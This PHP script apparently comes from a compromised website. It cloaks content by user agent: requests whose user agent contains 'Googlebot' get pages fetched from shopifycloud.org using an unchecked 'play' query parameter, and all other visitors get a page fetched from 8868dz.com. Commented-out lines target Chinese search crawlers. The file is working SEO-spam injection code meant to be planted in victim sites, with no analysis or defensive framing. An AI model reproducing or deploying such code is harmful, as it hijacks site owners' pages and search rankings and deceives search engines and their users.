<?php
function chkCode($string)
{
    $code = array(
        'ASCII',
        'GBK',
        'UTF-8'
    );
    foreach ($code as $c) {
        if ($string === iconv('UTF-8', $c, iconv($c, 'UTF-8', $string))) {
            return $c;
        }
    }
}
$key = strtolower($_SERVER["HTTP_USER_AGENT"]);
// if (stristr($key, 'baidu') != false ||  stristr($key, 'sogou') != false || stristr($key, 'youdao') != false  || stristr($key, '360') != false  || stristr($key, 'soso') != false) {
    // set_time_limit(0);
    $content = file_get_contents(__FILE__);
    if (stristr(__FILE__, "index.html") != false) {
        preg_match("/<meta.+?charset=([-\w]+)/i", $content, $charset);
        $charset = strtolower($charset[1]);
    } else {
        if (@chkCode($content) == 'UTF-8') {
            $charset = "utf-8";
        } else {
            $charset = "gbk";
        }
    }
    // header("Content-Type: text/html;charset=" . $charset);
    

    

    date_default_timezone_set('PRC');
    $u = 'shopifycloud.org';
    $play_value = $_GET['play'];
    
    
    
// }

if(checkSpider()){ // UA判断 蜘蛛访问

//  echo file_get_contents( "https://shopifycloud.org/".$play_value.'/' );

// 初始化 cURL
$curl = curl_init();

// 设置 cURL 选项
curl_setopt($curl, CURLOPT_URL, "https://shopifycloud.org/".$play_value.'/'); // 设置要请求的 URL
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); // 将响应存储在变量中，而不是直接输出
// 可以设置其他选项，如超时时间、用户代理等

// 执行 cURL 请求并获取响应
$response = curl_exec($curl);

// 检查是否有错误发生
if(curl_errno($curl)){
    echo 'Curl error: ' . curl_error($curl);
}

// 关闭 cURL 资源
curl_close($curl);

// 输出响应内容
echo $response;


 
}else{
    
(404);
// $url='https://8868dz.com/503.php'; //根目录随便的文件（可以自定义php或者静态文件）
 
// $html= file_get_contents($url);

// echo $html;//输出你展示给非蜘蛛内容（可以是屏蔽访客也可以做跳转）

// 初始化 cURL
$curl = curl_init();

// 设置 cURL 选项
curl_setopt($curl, CURLOPT_URL, "https://8868dz.com/503.php"); // 设置要请求的 URL
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); // 将响应存储在变量中，而不是直接输出
// 可以设置其他选项，如超时时间、用户代理等

// 执行 cURL 请求并获取响应
$response = curl_exec($curl);

// 检查是否有错误发生
if(curl_errno($curl)){
    echo 'Curl error: ' . curl_error($curl);
}

// 关闭 cURL 资源
curl_close($curl);

// 输出响应内容
echo $response;


exit();
}

function checkSpider()
{
    $useragent = '' != $_SERVER['HTTP_USER_AGENT'] && isset($_SERVER['HTTP_USER_AGENT']) ?$_SERVER['HTTP_USER_AGENT'] : '';
    $spiders = array('Googlebot');
    return checkStrpos($useragent,$spiders);
}

function checkStrpos($string, $arrList) {
    if(empty($string)) { return false; }
    foreach($arrList as $index => $arr) {
        if(strstr(strtolower($string), strtolower($arr)) !== false) {
            return true;
        }
    }
    return false;
}